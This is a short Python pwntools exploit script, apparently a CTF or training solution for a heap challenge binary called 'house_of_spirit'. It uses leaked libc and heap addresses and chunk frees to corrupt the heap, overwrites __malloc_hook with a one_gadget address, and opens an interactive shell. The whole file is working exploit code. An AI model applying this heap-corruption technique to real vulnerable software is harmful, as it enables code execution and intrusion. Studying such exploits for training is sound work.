#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./house_of_spirit")
libc = ELF("libc.so.6")
p = elf.process()
gdb.attach(p,"init-pwndbg")
p.recvuntil("puts() @ ")
leak1 = p.recvline()[:-1]
leak1 = int(leak1,16)
libc.address = leak1-libc.sym.puts
p.recvuntil("heap @ ")
leak2  = p.recvline()[:-1]
heap_base = int(leak2,16)
log.critical("Libc base: {}".format(hex(libc.address)))
log.critical("Heap base: {}".format(hex(heap_base)))
p.recvuntil("Enter your age: ")
age = p64(10)
p.sendline(age)
p.recvuntil("Enter your username: ")
p.send("00000000")

def malloc(size,data,chunk_name):
    p.sendlineafter("> ","1")
    p.sendlineafter("size: ",str(size))
    p.sendafter("data: ",data)
    p.sendafter("chunk name:",chunk_name)

def free(index):
    p.sendlineafter("> ","2")
    p.sendlineafter("index: ",str(index))

malloc(0x68,'0'*8,'a'*8)
malloc(0x68,'1'*8,'b'*8)
malloc(0x68,'2'*8,b'c'*8+p64(heap_base+0x10))
free(0)
free(1)
free(2)

__malloc_hook = libc.sym.__malloc_hook
malloc(0x68,p64(__malloc_hook-35),b'y'*8)
malloc(0x68,'4'*8,b'd'*8)
malloc(0x68,'5'*8,b'e'*8)
one_gadget = libc.address + 0xe1fa1
malloc(0x68,b'7'*19+p64(one_gadget),b'e'*8)
p.sendlineafter("> ","1")
p.sendlineafter("size: ","20")
p.interactive()